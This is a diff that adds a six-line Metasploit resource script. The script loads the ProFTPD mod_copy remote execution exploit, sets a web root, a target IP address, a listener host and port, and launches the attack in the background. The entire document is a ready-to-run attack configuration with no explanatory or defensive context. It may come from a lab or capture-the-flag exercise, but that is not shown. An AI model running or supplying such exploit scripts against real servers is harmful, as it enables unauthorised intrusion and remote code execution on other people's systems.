@@ -1,0 +1,6 @@
+use exploit/unix/ftp/proftpd_modcopy_exec
+set SITEPATH /var/www/html/
+set RHOSTS 34.221.179.160
+set LHOST 10.8.1.89
+set LPORT 4509
+exploit -j -z
